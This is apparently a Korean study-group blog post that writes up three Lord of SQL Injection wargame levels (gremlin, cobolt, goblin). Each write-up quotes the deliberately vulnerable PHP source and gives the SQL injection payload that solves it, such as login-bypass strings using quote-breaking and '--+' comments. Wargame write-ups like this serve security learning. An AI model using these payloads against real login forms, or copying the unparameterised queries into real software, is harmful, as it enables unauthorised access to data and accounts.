---
layout: default
title: Day51
nav_order: 2

parent: Hacking Project - W8
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
-----
원래 어제 LOS를 시작하려 했었는데 막상 오늘 결과가 나온다니까

어제 LOS가 손에 안잡혔다 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ

그래도 진짜 다행히 서류는 붙어서 맘편히 공부를 할 수 있겠다.

# > Lord of Sql injection: gremlin

아주 먼 옛날 LOB를 풀던 시절에 보았던 몬스터 이름들이 나와서 기분이 싱숭생숭하다.


## 삽질
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

get방식으로 id와 pw를 입력받으니 별도의 창이 없어도 url을 통해 인자를 넘길 수 있다.

<br>

## write-up

사용자의 입력이 DB의 쿼리문에 포함되므로 아래를 전송하여 참으로 만들었다.

과정에서 주석처리를 `--`와 `#`로 시도하였으나 불가능하여 db에 사용되는 주석처리 구문을 찾아보니 `--+`가 있었다.

```
id=' or 2>1 --+
```

플래그 값을 기대했었는데잉

![image-20220607213841450](../img/image-20220607213841450.png)

<br><br><br>

-----

# > LoS: cobolt

## 삽질

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

<br>

## writeup

쿼리문의 결과 중 id가 admin이여야하므로 그냥 참이 되는 쿼리문으로 해서는 안된다.

```
id=admin' --+
```

위 쿼리문을 통해 SELECT로 admin에 관한 정보를 가져오자!


![image-20220607220400443](../img/image-20220607220400443.png)

<br><br><br>

-----

# LoS: goblin

## 삽질

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

id 값이 guest로 고정되어 있지만 admin으로 변경해야 성공이다. 그리하여 쿼리문의 논리 연산자 우선순위를 생각해서 `or`을 이용해보았다

```
no=2 or id='admin'
```

이에 대한 결과는 

![image-20220607221312390](img/image-20220607221312390.png)

무심코 지나쳤었는데 `'` 기호와 `"`, `/` ' 등 막혀있는 것을 확인했다.

<br>

## writeup

and연산이 or연산보다 먼저 처리된 이후에 or이 처리된다. 때문에 or을 삽입하여 구문을 보낼 경우 id=guest 그리고 +a 에 대한 결과를 거짓으로 만든 다음, 뒷 구문에서 admin을 가져올 수 있도록 쿼리를 만들면 되겠다.

![image-20220607222601245](../img/image-20220607222601245.png)

no=1일 경우에 Hello guest를 확인하였기에 admin 계정의 no만 게싱해내면 된다. no=0과 no=2를 시도했더니 no=2에서 얻을 수 있었다.

```
no=3 or no=2
```

![image-20220607222216642](../img/image-20220607222216642.png)
